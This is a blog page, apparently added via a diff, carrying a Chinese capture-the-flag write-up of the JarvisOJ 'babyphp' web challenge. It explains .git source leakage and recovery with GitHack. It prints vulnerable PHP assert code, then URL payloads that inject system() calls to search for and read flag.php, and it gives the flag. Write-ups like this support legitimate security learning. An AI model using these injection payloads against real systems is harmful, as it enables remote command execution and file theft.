@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>ctf-web2(原创) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="jarvisoj babyphp1. .git源码泄露2. php基础理解.git源码泄露：  .git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks&#x2F;、info&#x2F;、objects&#x2F;、refs&#x2F;等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.">
+<meta property="og:type" content="website">
+<meta property="og:title" content="ctf-web2(原创)">
+<meta property="og:url" content="http://zmh2000829.github.io/ctf-web2.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="jarvisoj babyphp1. .git源码泄露2. php基础理解.git源码泄露：  .git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks&#x2F;、info&#x2F;、objects&#x2F;、refs&#x2F;等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://zmh2000829.github.io/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb1.png">
+<meta property="og:image" content="http://zmh2000829.github.io/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb2.png">
+<meta property="og:image" content="http://zmh2000829.github.io/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb3.png">
+<meta property="og:image" content="http://zmh2000829.github.io/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb4.png">
+<meta property="article:published_time" content="2020-07-20T13:47:31.000Z">
+<meta property="article:modified_time" content="2020-08-01T13:21:34.169Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zmh2000829.github.io/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://zmh2000829.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/ctf-web2.html" class="article-date">
+  <time datetime="2020-07-20T13:47:31.000Z" itemprop="datePublished">2020-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctf-web2(原创)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="jarvisoj-babyphp"><a href="#jarvisoj-babyphp" class="headerlink" title="jarvisoj babyphp"></a><u>jarvisoj babyphp</u></h4><h6 id="1-git源码泄露"><a href="#1-git源码泄露" class="headerlink" title="1. .git源码泄露"></a>1. .git源码泄露</h6><h6 id="2-php基础"><a href="#2-php基础" class="headerlink" title="2. php基础"></a>2. php基础</h6><p><strong><em>理解.git源码泄露</em></strong>：</p>
+<p> <em>.git文件夹是在clone或者init一个项目后生成的，其含有HEAD、config、description、hooks/、info/、objects/、refs/等，几乎包含了让git可以正常使用的所有信息。可以利用.git文件来恢复某项目的源代码，因此在项目部署后忘记删除.git文件，会造成由于.git文件导致的源码泄露的情况。</em></p>
+<p><img src="/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb1.png" alt="web1"></p>
+<p>根据提示可以推测有.git源码泄露（<em>同样我们可以直接在网站后加.git/config直接检测是否有.git源码泄露）</em>，使用工具GitHack 在index.php中发现源代码。</p>
+<p><img src="/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb2.png" alt="web2"></p>
+<p>if (isset($_GET[‘page’])) {<br>    $page = $_GET[‘page’];<br>} else {<br>    $page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;</p>
+<p>简单的php，直接用hackbar，get型注入构造XXXX/?page=XXXX，利用上篇文章的模板，直接先爆出含有flag名的文件<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“find / -name ‘flag</em>‘“)</p>
+<p><img src="/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb3.png" alt="web3"></p>
+<p>发现/opt/lampp/htdocs/templates/flag.php，正好是我们在GitHack得到的flag.php，继续构造<em><a href="http://web.jarvisoj.com:32798/?page=&#39;.system" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;.system</a>(“cat /opt/lampp/htdocs/templates/flag.php”).’</em></p>
+<p><img src="/E:%5C%E5%8D%9A%E5%AE%A2%5Csource%5Cimages%5Cweb4.png" alt="web4"></p>
+<p>直接右键看网页源代码找到了被注释的flag -&gt; 61dctf{8e_careful_when_us1ng_ass4rt}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://zmh2000829.github.io/ctf-web2.html" data-id="ckdbpulnz0001c4vb0h1k9m83" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/08/01/ctf-web/">ctf-web</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/ctf-web2/">ctf-web2</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/20/ctf-web1/">ctf-web1之基础</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/20/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
